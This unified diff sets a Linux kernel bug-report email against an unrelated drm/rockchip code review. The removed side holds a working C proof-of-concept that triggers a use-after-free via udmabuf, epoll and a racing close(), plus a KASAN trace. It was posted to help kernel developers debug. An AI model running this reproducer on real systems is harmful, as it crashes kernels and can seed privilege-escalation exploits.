@@ -2,81 +2,152 @@ Return-Path: <dri-devel-bounces@lists.freedesktop.org>
 X-Original-To: lists+dri-devel@lfdr.de
 Delivered-To: lists+dri-devel@lfdr.de
 Received: from gabe.freedesktop.org (gabe.freedesktop.org [131.252.210.177])
-	by mail.lfdr.de (Postfix) with ESMTPS id 300948BC882
-	for <lists+dri-devel@lfdr.de>; Mon,  6 May 2024 09:44:31 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTPS id 5E1F48BC883
+	for <lists+dri-devel@lfdr.de>; Mon,  6 May 2024 09:44:33 +0200 (CEST)
 Received: from gabe.freedesktop.org (localhost [127.0.0.1])
-	by gabe.freedesktop.org (Postfix) with ESMTP id 2CFBC1121C4;
-	Mon,  6 May 2024 07:44:25 +0000 (UTC)
+	by gabe.freedesktop.org (Postfix) with ESMTP id E3C0010EE36;
+	Mon,  6 May 2024 07:44:27 +0000 (UTC)
 Authentication-Results: gabe.freedesktop.org;
-	dkim=pass (2048-bit key; unprotected) header.d=gmail.com header.i=@gmail.com header.b="Qws6mukj";
+	dkim=pass (1024-bit key; unprotected) header.d=cherry.de header.i=@cherry.de header.b="MBiulqz1";
 	dkim-atps=neutral
 X-Original-To: dri-devel@lists.freedesktop.org
 Delivered-To: dri-devel@lists.freedesktop.org
-Received: from mail-ot1-f50.google.com (mail-ot1-f50.google.com
- [209.85.210.50])
- by gabe.freedesktop.org (Postfix) with ESMTPS id 0517F10EA3C
- for <dri-devel@lists.freedesktop.org>; Fri,  3 May 2024 11:54:30 +0000 (UTC)
-Received: by mail-ot1-f50.google.com with SMTP id
- 46e09a7af769-6eb93ec8804so5020692a34.2
- for <dri-devel@lists.freedesktop.org>; Fri, 03 May 2024 04:54:30 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=gmail.com; s=20230601; t=1714737270; x=1715342070; darn=lists.freedesktop.org;
- h=content-transfer-encoding:in-reply-to:from:cc:content-language
- :references:to:subject:user-agent:mime-version:date:message-id:from
- :to:cc:subject:date:message-id:reply-to;
- bh=v9RNLcQN3p6zT0UsH7fQCtkFK7ZrktPHW9/cBp7YLVw=;
- b=Qws6mukjRbaIyRMwfRx4kUXc6ZPpDiVazErbXu16kOeUhOO9XAR1Aj3BFKTdcvqm8q
- si3dr/QAudI24RrKWBg6AU+zycDry68TmKiFuguOetaj9eh/uaWR0s+Xfoa7C05Nvw16
- q6s5Aq/TAHu0DeR2KEmfsuQV+GKqPSc/FnCtNBfNe6/zRJ3DA97AKDLDfZ3LSgbhyDes
- e3J7psXCXAktci6K/LaOTgHqftrW13uDFSIlSNjvBVe2bIDQBJe8r9DGpfJ10QskAGkX
- HQnBRJX1mpiqTUx8iZCYHwj8CEShcugUXWJxYKqeZCv/N+k9OztYYpnKPpm91meecvR3
- JzAQ==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=1e100.net; s=20230601; t=1714737270; x=1715342070;
- h=content-transfer-encoding:in-reply-to:from:cc:content-language
- :references:to:subject:user-agent:mime-version:date:message-id
- :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
- bh=v9RNLcQN3p6zT0UsH7fQCtkFK7ZrktPHW9/cBp7YLVw=;
- b=VXBmwbueUBgMnx98Q0OXl/Wdc8upLmHyjItGNKLHDt/6gm3hQ5uQSNuJ8xzF7r/0UH
- utiOsYMj43t3a5pPYEUi+AmOLIc1fayrPKBXSBRZiZYEXBxrpvYsT3vTWs/fVl5dGJdN
- SbleTewWzMz98KzbxImXuqNPE8WW2j+2SFZf4tGVFMSu/Bp+bQsSIjgQJWWiB7oOdi5G
- ynPXc6O4hwt06Pu3B4G4yObENZzGGJCXx2lOWUMJeroV5UgWw7rAaHvoGhVvNMqTLmCC
- oPeDlD9rlR2sDYxss5npkrfTPUwlvhRBkbWMWWyhn1sng0/8IMlrAXP/UMgd71KQmv5W
- Z9fw==
-X-Forwarded-Encrypted: i=1;
- AJvYcCVClUIkrM7cAY4rY50mdoEMqI83hy/9GkQI8P7bxSJUmASJ5VgFla9yFqTjPsesHBJ2I2BhpS2xdLcP/e10XkPJ3Jd3q0iV4Pwf6nJhoRKC
-X-Gm-Message-State: AOJu0Yzy7WKI/Qx9CDhWkfbsbDqyeHI48VKprSDdUYfRq76+65HUXdTK
- LfI7CEsB8z/GI456Z0tZkavYW14v0wWM59jozA7Jsf0FadG3s3W65f+4IQ==
-X-Google-Smtp-Source: AGHT+IEUb71YrMo7ELiUmyY02B7z0Sr4II89eurwWz96Ln1/3LjWRswdXxe5x6bFZ4CPTVEtfwhGaw==
-X-Received: by 2002:a05:6870:46a3:b0:22a:4c6a:39ea with SMTP id
- a35-20020a05687046a300b0022a4c6a39eamr2906165oap.14.1714737269733; 
- Fri, 03 May 2024 04:54:29 -0700 (PDT)
-Received: from ?IPV6:2001:ee0:50f5:a230:db34:1b4d:d1d7:db98?
- ([2001:ee0:50f5:a230:db34:1b4d:d1d7:db98])
- by smtp.gmail.com with ESMTPSA id
- b185-20020a6334c2000000b0061f42afa8d0sm90331pga.6.2024.05.03.04.54.25
- (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
- Fri, 03 May 2024 04:54:29 -0700 (PDT)
-Message-ID: <7c41cf3c-2a71-4dbb-8f34-0337890906fc@gmail.com>
-Date: Fri, 3 May 2024 18:54:22 +0700
-MIME-Version: 1.0
+Received: from EUR05-DB8-obe.outbound.protection.outlook.com
+ (mail-db8eur05on2108.outbound.protection.outlook.com [40.107.20.108])
+ by gabe.freedesktop.org (Postfix) with ESMTPS id A2C6E10FBA5
+ for <dri-devel@lists.freedesktop.org>; Fri,  3 May 2024 12:13:43 +0000 (UTC)
+ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
+ b=a/AYvRlA3p1pPnV7i7gQPZrESMRwT0jYqxq4bXRvEnNNPJ0kt4na9yT0ob4B/KLEnku5BTdZ8To5o4S48VPOTB2g/2k/rOuR3wQkyUk1XFQI04JM26QcYFJ0suUR4vpA2HQFWZJy85FkN8l4f0EFeF2CNSw8Fakp5w3ly7VpOtEl9SZO3wrTk56h5E1C5TIytPA/CvH8rTZHGC1OZWLjRZfIN4kIlIGS2DwUmqJh3UjC1nTnn3VLFaHYTTrXCZMAJmn/sSSyb/9kcuG7jMG1Y/2kkgDpjeCjJVl+Ji7Uic1rZc8BBwkYmXRlKEkcSqoBR9Y6sGx+rIOZfbAyRsNcHQ==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com; 
+ s=arcselector9901;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
+ bh=UkQQWDeC+Z1oTTQIq+wmmD8aCoOL7Buzzy4i/4wwYOk=;
+ b=TRmGwJ6b82nj2dfwT/khOWYShMiWYdlsN4xsAj2aVVWszPsyqEoxIlNs4OC+jswhsaKNFNZnGKDbe+XpKFLdspIjKj0E5T7I6vle+7KX5X926Vhr99V8gXQB9V1mxpmQwShbWn5oa1+ukE+L/P5SLDSEMh0gauzm6BgH/H/4Al9AVkaLVpcKTllOIJK4EvdKVtSYlRlZWjbDLtoFtNVFQOWn24PVt4YrGaA/F91ZOXAg4QZrrB3LlDzGv2zdZVQxeJl8LfTHczzHp6vBNE6KtzAqyKNxnRZPHjKjTHp1kHEdn0x6Oawh3mJGpX4q2DwzNGMjRWO6xyoSrRyjOyv2Qg==
+ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
+ smtp.mailfrom=cherry.de; dmarc=pass action=none header.from=cherry.de;
+ dkim=pass header.d=cherry.de; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=cherry.de; s=selector1;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
+ bh=UkQQWDeC+Z1oTTQIq+wmmD8aCoOL7Buzzy4i/4wwYOk=;
+ b=MBiulqz1B97m2the2aaMzewtQ1okcScKZdyMmw/sXPK7g4J2oWCb9Mqx4uySuhnrz2lovVhW4myyAKUJqDSB/4uJSfJ+Rw33UD6PmQ4m3si65O8U9jIzmp7kF2hBz5Ry7BR1OXDLyO5uRLeSCEZAEOj7WBBNYPi0wAsmeEGiUQY=
+Authentication-Results: dkim=none (message not signed)
+ header.d=none;dmarc=none action=none header.from=cherry.de;
+Received: from DB7PR04MB4842.eurprd04.prod.outlook.com (2603:10a6:10:1b::13)
+ by PA2PR04MB10123.eurprd04.prod.outlook.com (2603:10a6:102:403::22) with
+ Microsoft SMTP Server (version=TLS1_2,
+ cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.7544.29; Fri, 3 May
+ 2024 12:13:40 +0000
+Received: from DB7PR04MB4842.eurprd04.prod.outlook.com
+ ([fe80::ac08:df46:97bd:4ae6]) by DB7PR04MB4842.eurprd04.prod.outlook.com
+ ([fe80::ac08:df46:97bd:4ae6%6]) with mapi id 15.20.7544.029; Fri, 3 May 2024
+ 12:13:40 +0000
+Message-ID: <cb73853e-4201-4cc9-9e8a-f977e66241f6@cherry.de>
+Date: Fri, 3 May 2024 14:13:37 +0200
 User-Agent: Mozilla Thunderbird
-Subject: Re: [syzbot] [fs?] [io-uring?] general protection fault in __ep_remove
-To: syzbot <syzbot+045b454ab35fd82a35fb@syzkaller.appspotmail.com>,
- axboe@kernel.dk, brauner@kernel.org, io-uring@vger.kernel.org, jack@suse.cz,
- linux-fsdevel@vger.kernel.org, linux-kernel@vger.kernel.org,
- syzkaller-bugs@googlegroups.com, viro@zeniv.linux.org.uk
-References: <0000000000002d631f0615918f1e@google.com>
+Subject: Re: [PATCH 1/2] drm/rockchip: vop2: fix rk3588 dp+dsi maxclk
+ verification
+To: Heiko Stuebner <heiko@sntech.de>
+Cc: hjc@rock-chips.com, andy.yan@rock-chips.com,
+ dri-devel@lists.freedesktop.org, linux-arm-kernel@lists.infradead.org,
+ linux-rockchip@lists.infradead.org, linux-kernel@vger.kernel.org,
+ Heiko Stuebner <heiko.stuebner@cherry.de>
+References: <20240425195506.2935955-1-heiko@sntech.de>
+ <20240425195506.2935955-2-heiko@sntech.de>
 Content-Language: en-US
-Cc: Sumit Semwal <sumit.semwal@linaro.org>,
- =?UTF-8?Q?Christian_K=C3=B6nig?= <christian.koenig@amd.com>,
- linux-media@vger.kernel.org, dri-devel@lists.freedesktop.org,
- linaro-mm-sig@lists.linaro.org, linux-kernel@vger.kernel.org,
- Laura Abbott <laura@labbott.name>, Kees Cook <keescook@chromium.org>
-From: Bui Quang Minh <minhquangbui99@gmail.com>
-In-Reply-To: <0000000000002d631f0615918f1e@google.com>
+From: Quentin Schulz <quentin.schulz@cherry.de>
+In-Reply-To: <20240425195506.2935955-2-heiko@sntech.de>
 Content-Type: text/plain; charset=UTF-8; format=flowed
 Content-Transfer-Encoding: 7bit
+X-ClientProxiedBy: WA1P291CA0007.POLP291.PROD.OUTLOOK.COM
+ (2603:10a6:1d0:19::11) To DB7PR04MB4842.eurprd04.prod.outlook.com
+ (2603:10a6:10:1b::13)
+MIME-Version: 1.0
+X-MS-PublicTrafficType: Email
+X-MS-TrafficTypeDiagnostic: DB7PR04MB4842:EE_|PA2PR04MB10123:EE_
+X-MS-Office365-Filtering-Correlation-Id: 77eac953-ff15-48ff-c987-08dc6b6a77b5
+X-MS-Exchange-SenderADCheck: 1
+X-MS-Exchange-AntiSpam-Relay: 0
+X-Microsoft-Antispam: BCL:0;ARA:13230031|376005|1800799015|366007;
+X-Microsoft-Antispam-Message-Info: =?utf-8?B?RnZDR0V0VWlxUjJUbTRESWU2dmhraCt5M1dqcEEwMTY0dUtiZXpIVWFSNzF4?=
+ =?utf-8?B?K0RZeVpsRWVlSDNIcWtoMGRvUUl3NXdveit3dXllT1F1bkJGUWhIMTBsRjl2?=
+ =?utf-8?B?MWNtbXZWMkRGOTlhSmZVd3NIN3dTU0htSU1VM1lmcjdKN2dTd2dmZGl5NUpp?=
+ =?utf-8?B?bXh1NGRKU0dFZVU5Q2czai8ydXZxU0lrczM4eVlOZk9BVEQvYkVNUmcxcGRh?=
+ =?utf-8?B?RzFqTnc4TTFEdjRPaDBXdkplSzBzUkVaeFFCMnA1QVZxUWg4UHUyaW5qQVRj?=
+ =?utf-8?B?c1JIWWcvR1ZoWGhpR3hWd1NQaitpdXd0cXpxb3dia2lIazZUeW5Xajk4VDQz?=
+ =?utf-8?B?L0tvRTBEQUlQbCtpazMxUnpUaTVBYWR4NzlwRWNROXN2VXFvdUJKRmlPbDlK?=
+ =?utf-8?B?bFRZZGNPdzJQUlJJUWRGVE5ScFI2WU1VS2hoODBjaktRaHVDeXVlekR3VTFI?=
+ =?utf-8?B?Q1IxUCtkK3NvVWpKeTZlemQ1Z1dZYnNXTXVMUUNHb1E4cW4yN0o4UE9WUStp?=
+ =?utf-8?B?ZmJMMmxRUUVsREVuNmJuNzlzZ0dDNWo3T0VLWXF6NUhLeUJKVlBDd0cyM1dG?=
+ =?utf-8?B?MHNMUUJrR0FQTERHaS94WkR4eUFQcklUVUtFVU5wWUdma1NwNW9yWlBpcUpz?=
+ =?utf-8?B?MHl1Vi9PSEVvbExtUVMrUVJKdEdYUmoralFlTUJhK2ZFaWZkWjNNWmVjSTVT?=
+ =?utf-8?B?NDRIWDNkSG9tOWd1UFJzSktHTmQ2NHM2TUpub0gxcGVGdm5ITHVhZ1ZRbzkz?=
+ =?utf-8?B?MGxBK043eVRvbWdKQlZXZW90ZWY0bm9BN1FzL3FhalN2QTJyNG1pMjNSWWFt?=
+ =?utf-8?B?bmc2dFJnSWRZZmRYSHBoYzM4b25PZ1hYdFRtY0R0WTNjYW90R3lsQ1BLcGZD?=
+ =?utf-8?B?V3BlaWdDUmMyQ1hMOGE0V3FzejJ5NW1yZ202MVMvY3dJSk9OOURqNUlYaTM4?=
+ =?utf-8?B?Y2hBRDdVNVFtc0RXT0xmSkl3QUJONTc5MW1PRHpVU2FQdlB4OThBNitZUUpp?=
+ =?utf-8?B?L0Nud1hPMEtoZ1NyNmd1ejROcXdnYU1DWmRobHA2RjVIQXBXbFdQL284OWNG?=
+ =?utf-8?B?TEZUOThLMnhKOTdEY2czTFRGamhwcDU2bWpoY2paWEdtZ1FHdTBhMDRjZ2xM?=
+ =?utf-8?B?YXpTWXp6T3VjdVlad1BoYTVidmd4TkVNaERKRXgrOCtKWUMveVpUc2E2SE9z?=
+ =?utf-8?B?KzMydW5tMGZrYjlya1M2aUxKWG5iL0puQVlQYU1XWDJzMTdNQ3ZGRytrYmsz?=
+ =?utf-8?B?NEo2bkE0OWxXd1FqazAreG1nRVpsbGt3cTNQSkJ0OUVXUE5vd3I1Wjd0d1Ay?=
+ =?utf-8?B?VDRTZUtPU3prS2FmT1lRU1hNay9MQ0t4bmRqQk9ITmJFOHFqVUpraVJYWU1k?=
+ =?utf-8?B?YUV1V3RqYXByc1hXcnRyZXo1ZGJtVUNaS2FmbGUwNEwxaDR4M3U4OGd5QTJL?=
+ =?utf-8?B?dHROV1R3SkpiRWpqdzU5RkdYLzYzZ1hTTmVNNFVIVjg4WnRQMTREbG0wM2g2?=
+ =?utf-8?B?RFhucWNvTnlxL2d5ajNHa3Z4aGhXWXdNUnZ0SGZuK2lCNnkxendnQmMvTWgr?=
+ =?utf-8?B?cDJTWDVhZFl5SE55YmVZcmxYcWIrcmw5RUVlTmNMdnd5c0xsajVnL1lKaVZB?=
+ =?utf-8?B?eWpETTdzNUcyQlhHODBzdzBNOVlQcWdjRndyN0x1NmM3bGQ0bVdNUUhNYVFB?=
+ =?utf-8?B?UFhuVUZjUVpLQnVZTGZIQ2ROV0tpT0FuMDlKeGZsTnYyMS9hMGo3R0NRPT0=?=
+X-Forefront-Antispam-Report: CIP:255.255.255.255; CTRY:; LANG:en; SCL:1; SRV:;
+ IPV:NLI; SFV:NSPM; H:DB7PR04MB4842.eurprd04.prod.outlook.com; PTR:; CAT:NONE;
+ SFS:(13230031)(376005)(1800799015)(366007); DIR:OUT; SFP:1102; 
+X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
+X-MS-Exchange-AntiSpam-MessageData-0: =?utf-8?B?VCtRVlhCaHFsTVBrTElMTUF3NE1RTDFDYUNhYkZtZzhoL0NZdHVjT3Y4ckJv?=
+ =?utf-8?B?Z2xtdnEzdFA4M1lqWEc2QVRhWVJwZC85b1FFY082QUN4NFoyd3JWS1dVK29U?=
+ =?utf-8?B?UnE0dSthb3krRTQ0UDQ1eDU0aXZoV3ROVzYzWEk4ZlNqSmU1eGN3dTVUbUIz?=
+ =?utf-8?B?am51QUpqYjNnS1R6eDR5QVMxOGFXNUw0alBmdGN5NXpHRm1BVGcwNDhPd1Rw?=
+ =?utf-8?B?czEwT0ZjUW1wNFQ2TlVWSjdHU3gxWW5ENTkwbHN3ZTdCcTFZaForMWdiNFNy?=
+ =?utf-8?B?V3RaazV5TXRwMmJRQ0xZL2xUM2ZYenliN1BrbjRPUWJPUFFqVUxFRGNUZVNz?=
+ =?utf-8?B?SDJxbDNBRWdsZVBITFhLb3FPZUJQNFUxR3hZMmoxazEzVzhsZTBvQTZ1VGNS?=
+ =?utf-8?B?OEdaOE5VWlBCMTRPcDdrakt2SmVrWVpqUVFhcFBSYUljSXFPdFVaR0V2RVJ6?=
+ =?utf-8?B?QWJEa0MvWGxSWTZlRnpIayt0S0xnTTZKR1NJbWtVNnBsWG9SQ3JvQmVsSWll?=
+ =?utf-8?B?YTlxaUJjR3RBeWNkR3lMajhPRVY4ODNVbnhMOU5KRHlRTCs2UitxQ1VPckJX?=
+ =?utf-8?B?UFJYSHorb1R5M3libUh0QmMzVGxUL09NY2pOdDR5UE03M084aCszeDdpNmRT?=
+ =?utf-8?B?TVpPUG8rVlUwalkyMzJHQytLQ0FkTGRqNG8wYkFwSTFRNSt3MDI0YmEzU291?=
+ =?utf-8?B?TWRxb0ZpOXpWTmk5ZlVWTjQ3SG0xNEx3bmg0ckdycGozK3JabzJ6SjgvSnBO?=
+ =?utf-8?B?MTVOUElPSTcrWXMraXgrMkVtR25WSWRQMTI5TWR2cTBVM05vNVVFUndhODRK?=
+ =?utf-8?B?T1ovQ1oxNmJady9MVVNVbUt1K0grWlpTaHNwbERKaWJuNENGckl0Z0RHVXpw?=
+ =?utf-8?B?djB4T25uNTVhZmx6S3RRbnlaYy8wekh6WGRPenh0YS9qQWozRW43Mi9Iekth?=
+ =?utf-8?B?cmI5Y0FYSWVhM2MzQlhwMmk3TnE1WlRpcHNDdklaWWlLTTZYSDRVaFdxV0hy?=
+ =?utf-8?B?ZGhOM0ZsK0p1b3BFL2JsTitleHBTYk1LdExZQW9BbENSOExHbEpnOEV5VjhT?=
+ =?utf-8?B?Z3U1aG9LZlJ5RWtJWFFLdEZ6alFLeHM3WWxjRVlWM1VjdVFWd3JXOEZ4MWUw?=
+ =?utf-8?B?UGtsa0RlZEx3TitieWVTRDB1b1MrcjJMbzlya24va1llOFBYNHBMVHJocWNM?=
+ =?utf-8?B?blUrME5sV0wwMDIwZEx1RVpvdWowS25TMDZLZit2b2c5VE9jYnNiY3ZjSE9S?=
+ =?utf-8?B?TXlCREtJWUovQlMvRmtWd3M2SWh5UXNmYlVlZlVKOTZSUWFXZWxjYi9Ebmda?=
+ =?utf-8?B?elM4VnRJdEMwQkF3OHpxMW9WREpNczBpTHZZaUxhdjdZL3VWVXJ3eGxqN1JH?=
+ =?utf-8?B?eFpYK1RBSXpVWFh5djEwSnpvSDJUbVNjMU1BZGFRMVR5dXFwdTlvbFhsREpB?=
+ =?utf-8?B?VXFrQlBnNjVMRm1IR29FcmpCcFdlSHJ5dGJrcnJqZXNUdWlvTVR2Uk1Kd1I3?=
+ =?utf-8?B?Yyt6aFlYdy9UcWdVQ3JxU3hoUWpDdFJMcFBwRk0vVldwaWJDdjF4cjJHb1dH?=
+ =?utf-8?B?RUVmZUpMemEranpqaTFRbFp2a3dYU1g4bmFzU0IwTEpscGNaL3dFdm45bkRo?=
+ =?utf-8?B?c2llWUtQMHdieDdld2FudUU1ZXJvTTJVd1cvSG4wUDZzTWV4WnZJUjZmdHhP?=
+ =?utf-8?B?bGN2aWkrSnJoV21YdUMwWUJnY3pHRTVralRXWis2eW5YNTBtUytUeGU4dXNZ?=
+ =?utf-8?B?WkhPWEJ2bHNXWEU2b2R4MkRpaHp2YmJUSisyVWlLWDNLa2xiOERGeVhCbzNr?=
+ =?utf-8?B?THM4eGZ4Szlsb0tWN2JMSDFRZEJ1SGRpN2dtVzRiVGJxbVA1bXB1R2lXVWJQ?=
+ =?utf-8?B?akJvZlVMUFNLcC9HeGtRUlRncjVlNVR3dkU2MW02Wjg3TnVTS01GSndGbzEy?=
+ =?utf-8?B?RFBBWGRKQTVBMmF5b2JBdWVDOVZSWERmVFl5cDZ0NXZnNnRudEJwdXBhcnVM?=
+ =?utf-8?B?VCtvNDdsVm1QRW5xMytKWEh2VGVPb3lreXQydmVVRVFIUWVlWDhDN0RKMTRP?=
+ =?utf-8?B?MUtDVGZkb3JmVFJxUk5OUlpjbmJkdzNvRWthcWxKdlEwdG4vUWF1OXFVZ0VU?=
+ =?utf-8?B?RDc0VTVENmtucGtvUHR2YlJzNnY3L0xRRWRtcjZVVWMxcjFGdDRvRzBiUnNl?=
+ =?utf-8?B?cnc9PQ==?=
+X-OriginatorOrg: cherry.de
+X-MS-Exchange-CrossTenant-Network-Message-Id: 77eac953-ff15-48ff-c987-08dc6b6a77b5
+X-MS-Exchange-CrossTenant-AuthSource: DB7PR04MB4842.eurprd04.prod.outlook.com
+X-MS-Exchange-CrossTenant-AuthAs: Internal
+X-MS-Exchange-CrossTenant-OriginalArrivalTime: 03 May 2024 12:13:40.0432 (UTC)
+X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
+X-MS-Exchange-CrossTenant-Id: 5e0e1b52-21b5-4e7b-83bb-514ec460677e
+X-MS-Exchange-CrossTenant-MailboxType: HOSTED
+X-MS-Exchange-CrossTenant-UserPrincipalName: JVixKWnqChLmwhX4C6jYix7emsLPkI4EMxNlDZNVM3etQ6gsbMgzdfVWM617GBXOsXNC9kCybPOwu9AFDIsaoySUXIGwG1DP0vBqye4qgTI=
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: PA2PR04MB10123
 X-Mailman-Approved-At: Mon, 06 May 2024 07:44:23 +0000
 X-BeenThere: dri-devel@lists.freedesktop.org
 X-Mailman-Version: 2.1.29
@@ -93,225 +164,52 @@ List-Subscribe: <https://lists.freedesktop.org/mailman/listinfo/dri-devel>,
 Errors-To: dri-devel-bounces@lists.freedesktop.org
 Sender: "dri-devel" <dri-devel-bounces@lists.freedesktop.org>
 
-Hi everyone,
+Hi Heiko,
 
-I've tried to debug this syzkaller's bug report
+On 4/25/24 9:55 PM, Heiko Stuebner wrote:
+> From: Heiko Stuebner <heiko.stuebner@cherry.de>
+> 
+> The clock is in Hz while the value checked against is in kHz, so
+> actual frequencies will never be able to be below to max value.
+> Fix this by specifying the max-value in Hz too.
+> 
+> Fixes: 5a028e8f062f ("drm/rockchip: vop2: Add support for rk3588")
+> Signed-off-by: Heiko Stuebner <heiko.stuebner@cherry.de>
+> ---
+>   drivers/gpu/drm/rockchip/rockchip_drm_vop2.c | 4 ++--
+>   1 file changed, 2 insertions(+), 2 deletions(-)
+> 
+> diff --git a/drivers/gpu/drm/rockchip/rockchip_drm_vop2.c b/drivers/gpu/drm/rockchip/rockchip_drm_vop2.c
+> index 9bee1fd88e6a2..523880a4e8e74 100644
+> --- a/drivers/gpu/drm/rockchip/rockchip_drm_vop2.c
+> +++ b/drivers/gpu/drm/rockchip/rockchip_drm_vop2.c
+> @@ -1719,7 +1719,7 @@ static unsigned long rk3588_calc_cru_cfg(struct vop2_video_port *vp, int id,
+>   		else
+>   			dclk_out_rate = v_pixclk >> 2;
+>   
+> -		dclk_rate = rk3588_calc_dclk(dclk_out_rate, 600000);
+> +		dclk_rate = rk3588_calc_dclk(dclk_out_rate, 600000000);
+>   		if (!dclk_rate) {
+>   			drm_err(vop2->drm, "DP dclk_out_rate out of range, dclk_out_rate: %ld KHZ\n",
 
-Here is my minimized proof-of-concept
+It seems the error message is incorrect as well and should be saying Hz 
+instead of KHz. (note also the lowercase z).
 
-#define _GNU_SOURCE
-#include <stdio.h>
-#include <stdlib.h>
-#include <sys/epoll.h>
-#include <linux/udmabuf.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <sys/mman.h>
-#include <pthread.h>
-#include <sys/ioctl.h>
+>   				dclk_out_rate);
+> @@ -1736,7 +1736,7 @@ static unsigned long rk3588_calc_cru_cfg(struct vop2_video_port *vp, int id,
+>   		 * dclk_rate = N * dclk_core_rate N = (1,2,4 ),
+>   		 * we get a little factor here
+>   		 */
+> -		dclk_rate = rk3588_calc_dclk(dclk_out_rate, 600000);
+> +		dclk_rate = rk3588_calc_dclk(dclk_out_rate, 600000000);
+>   		if (!dclk_rate) {
+>   			drm_err(vop2->drm, "MIPI dclk out of range, dclk_out_rate: %ld KHZ\n",
 
-#define err_msg(msg) do {perror(msg); exit(1);} while(0)
+Ditto.
 
-void *close_thread(void *arg)
-{
-     int fd = (int) (long) arg;
-     close(fd);
-}
+Otherwise,
 
-int main()
-{
-     int fd, dmabuf_fd, memfd, epoll_fd, ret;
-     struct udmabuf_create dmabuf_arg = {};
-     struct epoll_event event = {
-         .events = EPOLLIN | EPOLLOUT,
-     };
-     pthread_t thread;
+Reviewed-by: Quentin Schulz <quentin.schulz@cherry.de>
 
-     memfd = memfd_create("test", MFD_ALLOW_SEALING);
-     if (memfd < 0)
-         err_msg("memfd-create");
-
-     if (ftruncate(memfd, 0x1000) < 0)
-         err_msg("ftruncate");
-
-     ret = fcntl(memfd, F_ADD_SEALS, F_SEAL_SHRINK);
-     if (ret < 0)
-         err_msg("add-seal");
-
-     fd = open("/dev/udmabuf", O_RDWR);
-     if (fd < 0)
-         err_msg("open");
-
-     dmabuf_arg.memfd = memfd;
-     dmabuf_arg.size = 0x1000;
-     dmabuf_fd = ioctl(fd, UDMABUF_CREATE, &dmabuf_arg);
-     if (dmabuf_fd < 0)
-         err_msg("ioctl-udmabuf");
-
-     epoll_fd = epoll_create(10);
-     if (epoll_fd < 0)
-         err_msg("epoll-create");
-
-     ret = epoll_ctl(epoll_fd, EPOLL_CTL_ADD, dmabuf_fd, &event);
-     if (ret < 0)
-         err_msg("epoll-ctl-add");
-
-     pthread_create(&thread, NULL, close_thread, (void *) (long) dmabuf_fd);
-     epoll_wait(epoll_fd, &event, 1, -1);
-     return 0;
-}
-
-When running the above proof-of-concept on Linux 6.9.0-rc6 with KASAN 
-and the
-following patch for easier reproducible, I got the KASAN bug report
-
-diff --git a/drivers/dma-buf/dma-buf.c b/drivers/dma-buf/dma-buf.c
-index 8fe5aa67b167..de3463e7d47b 100644
---- a/drivers/dma-buf/dma-buf.c
-+++ b/drivers/dma-buf/dma-buf.c
-@@ -27,6 +27,7 @@
-  #include <linux/mm.h>
-  #include <linux/mount.h>
-  #include <linux/pseudo_fs.h>
-+#include <linux/delay.h>
-
-  #include <uapi/linux/dma-buf.h>
-  #include <uapi/linux/magic.h>
-@@ -240,6 +241,7 @@ static __poll_t dma_buf_poll(struct file *file, 
-poll_table *poll)
-         struct dma_resv *resv;
-         __poll_t events;
-
-+       mdelay(1000);
-         dmabuf = file->private_data;
-         if (!dmabuf || !dmabuf->resv)
-                 return EPOLLERR;
-
- > while true; do ./mypoc_v2; done
-==================================================================
-BUG: KASAN: slab-use-after-free in __fput+0x164/0x523
-Read of size 8 at addr ffff88800051e830 by task mypoc_v2/402
-
-CPU: 0 PID: 402 Comm: mypoc_v2 Not tainted 6.9.0-rc5+ #11
-Call Trace:
-  <TASK>
-  dump_stack_lvl+0x49/0x65
-  ? __fput+0x164/0x523
-  print_report+0x170/0x4c2
-  ? __virt_addr_valid+0x21b/0x22c
-  ? kmem_cache_debug_flags+0xc/0x1d
-  ? __fput+0x164/0x523
-  kasan_report+0xae/0xd5
-  ? __fput+0x164/0x523
-  __fput+0x164/0x523
-  ? __pfx___schedule+0x10/0x10
-  task_work_run+0x16a/0x1bb
-  ? __pfx_task_work_run+0x10/0x10
-  ? __x64_sys_epoll_wait+0x107/0x143
-  resume_user_mode_work+0x21/0x44
-  syscall_exit_to_user_mode+0x5d/0x76
-  do_syscall_64+0xb5/0x107
-  entry_SYSCALL_64_after_hwframe+0x76/0x7e
-RIP: 0033:0x44d99e
-Code: 10 89 7c 24 0c 89 4c 24 1c e8 2e 8c 02 00 44 8b 54 24 1c 8b 54 24 
-18 41 89 c0 48 8b 74 24 10 8b 7c 24 0c b8 e8 00 00 00 0f 05 <48> 3d 00 
-f0 ff ff 77 32 44 89 c7 89 44 24 0c e8 6e 8c 02 00 8b 44
-RSP: 002b:00007fffaec21770 EFLAGS: 00000293 ORIG_RAX: 00000000000000e8
-RAX: 0000000000000001 RBX: 00007fffaec219e8 RCX: 000000000044d99e
-RDX: 0000000000000001 RSI: 00007fffaec217c4 RDI: 0000000000000006
-RBP: 00007fffaec217f0 R08: 0000000000000000 R09: 00007fffaec2167f
-R10: 00000000ffffffff R11: 0000000000000293 R12: 0000000000000001
-R13: 00007fffaec219d8 R14: 00000000004dc790 R15: 0000000000000001
-  </TASK>
-
-Allocated by task 402:
-  kasan_save_stack+0x24/0x44
-  kasan_save_track+0x14/0x2d
-  __kasan_slab_alloc+0x47/0x55
-  kmem_cache_alloc_lru+0x12a/0x172
-  __d_alloc+0x2d/0x618
